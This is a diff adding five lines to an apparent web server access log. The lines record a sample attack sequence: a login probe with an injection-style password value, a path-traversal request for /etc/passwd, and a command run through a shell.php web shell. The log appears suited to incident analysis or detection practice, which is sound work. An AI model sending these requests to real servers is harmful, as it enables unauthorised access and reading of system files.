@@ -1,0 +1,5 @@
+::1 - - [26/Feb/2024:22:25:43 +0800] "GET /admin/account.php?action=signin&err_login=1 HTTP/1.1" 200 3753 "-" "Mozilla/5.0"
+192.168.126.1 - - [26/Feb/2024:22:29:03 +0800] "POST /login.php HTTP/1.1" 200 3753 "-" "Mozilla/5.0"
+192.168.126.1 - - [26/Feb/2024:22:29:08 +0800] "POST /login.php?user=admin&pass=1%3D1 HTTP/1.1" 200 3753 "-" "Mozilla/5.0"
+192.168.126.1 - - [26/Feb/2024:22:31:23 +0800] "GET /download.php?file=../../etc/passwd HTTP/1.1" 200 2345 "-" "curl/7.68.0"
+192.168.126.1 - - [26/Feb/2024:22:37:00 +0800] "GET /shell.php?cmd=whoami HTTP/1.1" 200 567 "-" "python-requests/2.28.0"
